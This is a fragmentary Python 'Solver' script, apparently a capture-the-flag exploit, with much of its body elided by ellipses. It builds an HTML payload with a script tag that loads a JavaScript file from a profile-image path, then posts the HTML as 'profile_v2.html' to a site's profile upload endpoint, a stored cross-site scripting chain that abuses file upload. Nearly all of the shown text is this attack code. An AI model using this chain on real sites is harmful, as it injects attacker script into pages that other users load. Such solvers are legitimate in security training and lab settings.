...
class Solver:
    ...
    def main(self):
        ...
        js_file_path = js_file_path if js_file_path.endswith(".js") else "/profileimage/z5437741.js"
...
<html>
    <script src="{js_file_path}"></script>
        ...
        filename, file = self.generate_file(HTML_PAYLOAD, "profile_v2.html")

        # Upload HTML File
        self.session.post(f"{BASE_URL}/profile", files={"file": (filename, file)})
